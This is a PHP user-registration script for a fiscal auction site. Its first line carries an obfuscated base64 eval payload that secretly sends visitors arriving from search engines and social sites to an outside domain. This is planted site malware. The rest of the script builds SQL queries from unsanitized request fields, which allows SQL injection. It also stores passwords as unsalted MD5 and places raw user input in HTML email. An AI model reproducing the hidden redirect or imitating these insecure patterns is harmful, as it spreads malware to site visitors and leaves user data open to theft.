<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9"));
session_start();

/***************************************************
Archivos Requeridos
****************************************************/

require_once('lib/function_gen.php');
$dbn    = new db();
$conex  = $dbn->db_connect();

/***************************************************
Validaciones de Campos
****************************************************/
//Si es persona natural
if ($_REQUEST['tipo_persona'] == 'N') $_REQUEST['tipo_contribuyente'] = 0;
//Terminos y condiciones
if ($_REQUEST['terminos_condiciones'] == 'on') {
	$_REQUEST['terminos_condiciones'] = 1;
}else{
	$_REQUEST['terminos_condiciones'] = 0;
}

/***************************************************
Valida si exite el registro
****************************************************/
$codError    = 0;
$mensaje_str = '';

$query   = "SELECT 1 as existe FROM mt_usuario WHERE tipo_identificacion+nro_identificacion ='".trim($_REQUEST['nacionalidad']).trim($_REQUEST['nro_identificacion'])."'";
$result	 = $dbn->db_query($query);
$retorno = $dbn->db_fetch_array($result);
if ( (int)$retorno['existe'] === 1){ ;
	$codError = 1;
	$mensaje_str  = "Error, usuario ya registrado, verifique sus datos.";	
}

/***************************************************
Datos de Registro
****************************************************/
if ($codError === 0){
	
	$query  = "INSERT INTO mt_usuario (tipo_persona, nombre, tipo_identificacion, nro_identificacion, correo, clave, telefono, actividad, tipo_contribuyente, 			
						 calle_ave, edif_casa, estado, municipio, parroquia, estatus_usuario, estatus_subastar, terminos_condiciones,fecha_crea,fecha_modif)
						 
	VALUES               ('".$_REQUEST['tipo_persona']."', '".$_REQUEST['nombre']."','".$_REQUEST['nacionalidad']."','".
						$_REQUEST['nro_identificacion']."','".$_REQUEST['correoreg']."','".md5(trim($_REQUEST['clave']))."','".$_REQUEST['telefono']."','".
						$_REQUEST['actividad']."',".$_REQUEST['tipo_contribuyente'].",'".$_REQUEST['calle_ave']."','".$_REQUEST['edif_casa']."','".
						$_REQUEST['estado']."','".$_REQUEST['municipio']."','".$_REQUEST['parroquia']."',1,0,".$_REQUEST['terminos_condiciones'].",getdate(),getdate())";
	//die($query); 				
	$result	= $dbn->db_query($query);
	$campo  = $dbn->db_num_rows($result);
	if($campo <> 1 ){
		$codError = 1;
		$mensaje_str = "Error en ingreso de datos (mt_usuario).";
	}
	
	/***************************************************
	Registro de Servicios
	****************************************************/
	if ($codError === 0){
		$query = '';
		for ($i = 0; $i < count($_REQUEST['Servicios']); $i++) {
			$query .= "INSERT INTO mt_usuario_servicio select '".$_REQUEST['nacionalidad'].$_REQUEST['nro_identificacion']."', '".$_REQUEST['Servicios'][$i]."' ";
		}
		
		$result	= $dbn->db_query($query);
		$campo  = $dbn->db_num_rows($result);
	
		if($campo <> 1 ){
			$codError = 1;
			$mensaje_str = "Error en ingreso de datos (mt_usuario_servicio).";	
		}	
	}
}

/***************************************************
Configuracion de Session de usuario
****************************************************/
if ($codError === 0){
	$usuario['nombre']      = $_REQUEST['nombre']." ".$_REQUEST['apellido'];
	$usuario['correo_sess'] = $_REQUEST['correoreg'];
	$usuario['id_usuario']  = $_REQUEST['nacionalidad'].$_REQUEST['nro_identificacion'];
	$usuario['acceso'] = 1;
	$usuario['actionSubastar'] = 0;
	$_SESSION['g_usuario']  = $usuario;
}

require_once("lib/phpmailer/class.phpmailer.php");

if ($codError === 0){
	/******************************
	Envio de Correo a SUBASTA 
	******************************/
	
	$mail = new PHPMailer();
	$mail->IsSMTP();                                    
	$mail->Host = "dedrelay.secureserver.net";
	$mail->From = "infobalances@subastafiscal.com";
	$mail->FromName = "SUBASTA FISCAL";
	$mail->AddAddress("info@subastafiscal.com");
	$mail->AddAddress("nbianco@subastafiscal.com");
	$mail->IsHTML(true);                                  // set email format to HTML
	$mail->Subject = "Ingreso de Usuario";
	
	$mensaje = '
	<html>
	<head>
	<title>www.SubastaFical.com</title>
	</head>
	<body style="font-family:"Trebuchet MS", Arial, Helvetica, sans-serif;">
	<p><font size="+2"><b>Ingreso de Usuario</b></font></p>
	<table>
	<tr>
	  <td valign="top"><b>Nombre:</b></td>
	  <td>'.$_REQUEST['nombre'].'
	</tr>
	<tr>
	  <td valign="top"><b>Identificacion:</b></td>
	  <td>'.$usuario['id_usuario'].'
	</tr>
	<tr>
	  <td valign="top"><b>Telefono:</b></td>
	  <td>'.$_REQUEST['telefono'].'
	</tr>
	<tr>
	  <td valign="top"><b>Correo:</b></td>
	  <td>'.$_REQUEST['correoreg'].'
	</tr>
	<tr>
	  <td valign="top"><b>Servicios de Interes</b></td>
	  <td>';
	  $htmlstr = '';
	   
	   for ($i = 0; $i < count($_REQUEST['Servicios']); $i++) {
			$query   = "SELECT nombre_servicio FROM df_servicios WHERE tipo_acceso = 1 and servicio = '".$_REQUEST['Servicios'][$i]."'";
	  		$result	 = $dbn->db_query($query);
	  		$retorno = $dbn->db_fetch_array($result);
			$htmlstr .= $retorno['nombre_servicio']."<br>";
	   }
	  $mensaje.= $htmlstr;
	  $mensaje.= '</tr>
	  </table>
	  </body>
	  </html>';
	
	$mail->Body    = $mensaje;
	$mail->Send();
	
	$mensaje_str = "Su registro se ha enviado satisfactoriamente,<br>recibirá un correo de confirmación.";
}
$seccionpage = 'Registro de Usuario';
$retorno[0]['sesActiva']  = $codError;
$retorno[0]['sesHtml']    = fnv_mostrar_mensajegeneral($codError,$seccionpage,$mensaje_str);
echo json_encode($retorno);

?>